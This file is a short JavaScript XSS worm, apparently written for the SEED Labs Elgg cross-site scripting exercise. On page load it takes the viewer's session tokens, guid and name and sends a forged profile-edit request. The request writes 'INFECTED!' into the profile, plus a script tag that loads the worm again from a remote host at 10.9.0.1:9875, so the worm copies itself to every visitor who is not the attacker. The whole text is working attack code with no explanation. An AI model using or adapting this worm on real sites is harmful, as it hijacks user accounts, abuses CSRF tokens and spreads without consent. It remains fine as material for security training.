window.onload = function () {
	var userName="&name="+elgg.session.user.name;
	var guid="&guid="+elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var sendurl="http://www.seed-server.com/action/profile/edit";
	
	var self_ref="<script type=\"text/javascript\" src=\"http://10.9.0.1:9875/worm_link.js\"></script>"
	var content="description=<p>INFECTED!</p>"+self_ref+ts+token+guid+userName;
	var samyGuid=59;
	
	if(elgg.session.user.guid!=samyGuid) {
		alert('INFECTED!');
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST", sendurl, true);
		Ajax.setRequestHeader("Content-Type", 
					"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
}
